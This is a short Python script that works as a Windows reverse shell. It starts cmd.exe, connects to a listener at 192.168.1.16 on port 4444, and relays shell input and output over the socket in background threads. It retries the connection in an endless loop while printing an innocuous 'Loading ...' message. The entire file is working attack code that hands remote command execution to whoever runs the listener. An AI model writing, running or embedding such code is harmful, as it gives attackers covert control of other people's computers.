
import socket
import os
import threading
import subprocess as sp
import time

def rev():
   p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
   s = socket.socket()

   try:
       s.connect(('192.168.1.16', 4444))
   except ConnectionRefusedError as e:
       print(f'refused ... Check if listener is running.')
       return

   def s_o():
       while True:
           try:
               output = os.read(p.stdout.fileno(), 1024)
               if not output:
                   break
               s.sendall(output)
           except Exception as e:
               print('Error sending output:', e)
               break

   def r_i():
       while True:
           try:
               data = s.recv(1024)
               if not data:
                   break
               p.stdin.write(data)
               p.stdin.flush()
           except Exception as e:
               print('Error receiving input:', e)
               break

   threading.Thread(target=s_o, daemon=True).start()
   threading.Thread(target=r_i, daemon=True).start()

   time.sleep(30)

while True:
   rev()
   print('Loading ...')
